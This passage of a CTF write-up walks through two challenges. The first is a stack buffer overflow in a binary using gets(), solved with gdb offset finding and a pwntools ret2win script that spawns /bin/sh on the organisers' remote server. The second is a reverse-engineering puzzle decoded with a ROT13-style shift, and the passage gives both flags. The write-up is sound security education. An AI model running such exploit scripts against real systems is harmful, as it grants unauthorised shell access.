Now lets view the functions present but since its stripped we won’t exactly see the real function names.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/5.png)

So on checking the content of each functions I saw this in FUN_00401200 which is likely the main function.
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/6.png)

So let me try to rename it to how its likely going to look like in the real c code

```
int main(void)

{
  char input[32]; //allocating 32 bytes of data in the buffer
  
  setvbuf(stdin,(char *)0x0,2,0);
  setvbuf(stdout,(char *)0x0,2,0);
  alarm(0x3c);
  design(); //calling the design function
  printf("b0fz: ");
  gets(input); //using dangerous gets function
  return 0;
}
```

On checking the other functions I came across this one also FUN_004011d6 which is a function calling /bin/sh
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/7.png)

Also let me try to rename it to how its likely going to look like in the real c code

```
void shell(void)

{
  system("/bin/sh");
  return;
}
```

Now from this what we can conclude is that there’s a function which call /bin/sh which would give us shell

But the main function isn’t calling that function

And also the main function is storing our input in a buffer which only allocates 32bytes in it and its using a vulnerable function which is `get` to receive our input.

Since we can cause a buffer overflow in the binary, instead of it just exiting we can instead make it call the function that would return /bin/sh and this can be done by overwriting the RIP (Instruction Pointer Register) to call the shell function.

So i used pwntools for the exploitation but first we need to get the following things:

The offset: the amount of bytes needed to get in the rbp

The address we would want the rip to call

So for this part I used gdb .

Firstly to get the offset we need to generate bytes of data and I used cyclic tool to create 100 bytes of data

```                                      
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ cyclic 100
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
```                                                                                                     

Now I opened the binary in gdb to run it

```                                   
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ gdb 0v3reZ 
GNU gdb (Debian 12.1-4) 12.1
Copyright (C) 2022 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.
Type "show copying" and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<https://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
    <http://www.gnu.org/software/gdb/documentation/>.

For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
90 commands loaded and 5 functions added for GDB 12.1 in 0.01ms using Python engine 3.10
Reading symbols from 0v3reZ...
(No debugging symbols found in 0v3reZ)
gef➤  
```

Now we run it by simply typing run/r and press enter key. 

It will then require an input from us so we give it the data gotten from cyclic

```
gef➤  r
Starting program: /home/mark/Desktop/CTF/Sabr/pwn/0v3reZ/0v3reZ 
[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0x7ffff7fc9000'
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".

 ▄▄████████▄ ▄███   ▄███ ▄█████████▄ ▄█████████▄ ▄▄█████████ ▄██████████
 ████▀▀▀████ ████   ████ ▀▀▀▀▀▀▀████ ████▀▀▀████ ████▀▀▀▀▀▀▀ ▀▀▀▀▀▀█████
 ████   ████ ████   ████     ▄▄▄███▀ ████▄▄▄███▀ ████▄▄▄         ▄████▀▀
 ████   ████ ████  ▄████     ▀▀▀███▄ ████▀▀▀███▄ ████▀▀▀       ▄████▀▀  
 ████▄▄▄████ ████▄█████▀ ▄▄▄▄▄▄▄████ ████   ████ ████▄▄▄▄▄▄▄ ▄█████▄▄▄▄▄
 ▀█████████▀ ████████▀▀  ██████████▀ ████   ████ ▀██████████ ███████████
  ▀▀▀▀▀▀▀▀▀  ▀▀▀▀▀▀▀▀    ▀▀▀▀▀▀▀▀▀▀  ▀▀▀▀   ▀▀▀▀  ▀▀▀▀▀▀▀▀▀▀ ▀▀▀▀▀▀▀▀▀▀▀


b0fz: aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401282 in ?? ()
```

After giving it the 100 bytes of `a` it causes a segmentation fault error, then in the new line it should return the information about the registers in it's current state

```
[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
$rax   : 0x0               
$rbx   : 0x007fffffffdf68  →  0x007fffffffe2cb  →  "/home/mark/Desktop/CTF/Sabr/pwn/0v3reZ/0v3reZ"
$rcx   : 0x007ffff7f9ca80  →  0x00000000fbad208b
$rdx   : 0x1               
$rsp   : 0x007fffffffde58  →  "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"
$rbp   : 0x6161616a61616169 ("iaaajaaa"?)
$rsi   : 0x1               
$rdi   : 0x007ffff7f9ea20  →  0x0000000000000000
$rip   : 0x00000000401282  →   ret 
$r8    : 0x0               
$r9    : 0x0               
$r10   : 0x007ffff7dd72a8  →  0x00100022000043f9
$r11   : 0x246             
$r12   : 0x0               
$r13   : 0x007fffffffdf78  →  0x007fffffffe2f9  →  "COLORFGBG=15;0"
$r14   : 0x00000000403e18  →  0x000000004011a0  →   endbr64 
$r15   : 0x007ffff7ffd020  →  0x007ffff7ffe2e0  →  0x0000000000000000
$eflags: [zero carry parity adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x33 $ss: 0x2b $ds: 0x00 $es: 0x00 $fs: 0x00 $gs: 0x00 
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
0x007fffffffde58│+0x0000: "kaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawa[...]"      ← $rsp
0x007fffffffde60│+0x0008: "maaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaaya[...]"
0x007fffffffde68│+0x0010: "oaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde70│+0x0018: "qaaaraaasaaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde78│+0x0020: "saaataaauaaavaaawaaaxaaayaaa"
0x007fffffffde80│+0x0028: "uaaavaaawaaaxaaayaaa"
0x007fffffffde88│+0x0030: "waaaxaaayaaa"
0x007fffffffde90│+0x0038: 0x00000061616179 ("yaaa"?)
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
     0x401277                  call   0x4010d0 <gets@plt>
     0x40127c                  mov    eax, 0x0
     0x401281                  leave  
 →   0x401282                  ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] Id 1, Name: "0v3reZ", stopped 0x401282 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
[#0] 0x401282 → ret 
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

Now we see that we are able to overwrite most of the registers with aabbcc*

Now lets get the first four byte of the rsp register in my case its “kaaa” it should be the same for you i guess

After getting that we then do `cyclic -l kaaa` and its output is 40 that means the offset is 40.

```                                        
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/pwn/0v3reZ]
└─$ cyclic -l kaaa
40
```

Now that we have the offset, lets get the memory address we want to return to and obviously its the /bin/sh address since that will give us shell.

Using ghidra we can see the address by checking the function FUN_004011d6
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/8.png)

Address = 0x4011de

Now I made an exploit to run the binary and exploit it here’s my script below

```
#!/usr/bin/python2
from pwn import *

#start the process either locally or remotely
io = process('./0v3reZ')
#io = remote('13.36.37.184',61000)

#cause the buffer overflow and making an address for it to return 
padding = "A" * 40 #amount of bytes * offset
addr = p64(0x4011de) #this address calls /bin/sh
payload = padding + addr 

#send the payload
io.send(payload)
io.interactive()
```

Then on running it
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/9.png)

So it worked now lets run this on the remote server here’s my script below

```
from pwn import *

#start the process either locally or remotely
#io = process('./0v3reZ')
io = remote('13.36.37.184',61000)

#cause the buffer overflow and making an address for it to return 
padding = "A" * 40 #amount of bytes * offset
addr = p64(0x4011de) #this address calls /bin/sh
payload = padding + addr 

#send the payload
io.send(payload)
io.interactive()
```
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/pwn/0v3reZ/10.png)

Flag: sabr{m3m0ry_c0rrup710n_iz_fUNNNNNNNNNNNN}

### Reverse Engineering Category 

### Bandit: 
![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/re/bandit/pic.JPG)

So I downloaded the file to my machine to analyze it.

It just shows a banner then takes in our input and then prints nope.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/re/bandit/1.png)

So next thing I did was to open it up in ghidra to see whats happening.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/re/bandit/2.png)

Now lets look at the main function.

We see that there are hexadecimal values stored in local_30,local_28,local_20,local_1e.

![1](https://raw.githubusercontent.com/markuched13/markuched13.github.io/main/posts/ctf/sabr/images/re/bandit/3.png)

```
undefined8 main(void)

{
  int iVar1;
  ushort **ppuVar2;
  undefined8 uVar3;
  long in_FS_OFFSET;
  int local_40;
  undefined8 local_38;
  undefined8 local_30;
  undefined8 local_28;
  undefined2 local_20;
  undefined local_1e;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  banner();
  local_40 = 0;
  local_38 = 0x6e65677b656f6e66;
  local_30 = 0x6e71616e635f7566;
  local_28 = 0x68705f72656e5f66;
  local_20 = 0x7267;
  local_1e = 0x7d;
  do {
    iVar1 = getchar();
    if (iVar1 == -1) goto LAB_004012f4;
    ppuVar2 = __ctype_b_loc();
    if (((*ppuVar2)[iVar1] & 0x400) == 0) {
      if (iVar1 != *(char *)((long)&local_38 + (long)local_40)) {
        puts("Nope!\n");
        uVar3 = 0xffffffff;
        goto LAB_004012f9;
      }
    }
    else {
      iVar1 = tolower(iVar1);
      if ((iVar1 + -0x54) % 0x1a + 0x61 != (int)*(char *)((long)&local_38 + (long)local_40)) {
        puts("Nope!\n");
        uVar3 = 0xffffffff;
        goto LAB_004012f9;
      }
    }
    local_40 = local_40 + 1;
  } while (local_40 < 0x1b);
  puts("You found the flag!\n");
LAB_004012f4:
  uVar3 = 0;
LAB_004012f9:
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return uVar3;
}
```

Now decoding that using xxd I got 

```                       
┌──(venv)─(mark㉿haxor)-[~/…/CTF/Sabr/re/bandit]
└─$ echo 0x6e65677b656f6e660x6e71616e635f75660x68705f72656e5f660x72670x7d | xxd -r -p
neg{eonfnqanc_ufhp_ren_frg} 
```

But now its encoded but not just encoded it doesn't seems arranged. 

What I then did was that i assumed that since the flag format is `sabr{` which has 4 bytes before `{` I then did something quite silly but it worked only that it took some minutes.

I made a python script which would print out all the alphabets in the string then return the output as a list

```
#!/usr/bin/python3

string = 'neg{eonfnqanc_ufhp_ren_frg}'
char_list = list(string)
print(char_list)
```

Now lets run it

```                 
┌──(mark㉿haxor)-[~/…/CTF/Sabr/re/bandit]
└─$ python3 rearrang.py 
['n', 'e', 'g', '{', 'e', 'o', 'n', 'f', 'n', 'q', 'a', 'n', 'c', '_', 'u', 'f', 'h', 'p', '_', 'r', 'e', 'n', '_', 'f', 'r', 'g', '}']
```                                                                                                                                                                   

Now what I did then was that since I didn't really know the encoding used to encode the string but I remembered i saw some sort of operation performed in the decompiled code

Here's the mathematical operation used in the binary
`if ((iVar1 + -0x54) % 0x1a + 0x61 != (int)*(char *)((long)&local_38 + (long)local_40)) `
which is the same as `(x -84) % 26 + 97` where x represents each character

So I then tried using a python script which will find each value of the encoded characters using the mathematical operation above neglecting characters '{', '_' and '}'

Here's the script 

```
array = ['n', 'e', 'g', '{', 'e', 'o', 'n', 'f', 'n', 'q', 'a', 'n', 'c', '_', 'u', 'f', 'h', 'p', '_', 'r', 'e', 'n', '_', 'f', 'r', 'g', '}']

result = []
for char in array:
    if char in ('{', '_', '}'):
        result.append(char)
    else:
        ascii_val = ord(char)
        decoded = (ascii_val - 84) % 26 + 97
        result.append(chr(decoded))

print(''.join(result))

``` 

On running it I got 

```
┌──(mark㉿haxor)-[~/…/CTF/Sabr/re/bandit]
└─$ python3 decode.py
art{rbasadnap_hsuc_era_set}
```

Now the wording looks more ok but one problem its scattered, so this is where it took my time lol 😅

I had to rearrang it but since I know that the first four bytes would be `sabr` and the 5th byte will be `{` also the flag will also end with `}`

And those underscore would be between 3 words `_` so the flag format should be like this `sabr{****_****_****_****}`

I just had to keep on trying each alphabet manually and a script would have been better in this case but i couldn't find my way out

So after all the struggle I ended up with: 

```
art{rbasadnap_hsuc_era_set} 
sabr{**_**_**_**} 
                          
baatdnaphsuceraset
abr{**_**_**_**}
                          
sabr{trash_pandas_are_cute}
```

Flag: sabr{trash_pandas_are_cute}




### Overview:

- This CTF was a really nice challenge which made me learn further things and not give up even though it was really painful 😂😂😂 

- Kudos to the organizers for hosting the ctf 

- So after all the struggle I managed to place 1st in the leaderboard scoring 1151 points overall 😅
- The username I used for the ctf is `PlsHackMe` 😅





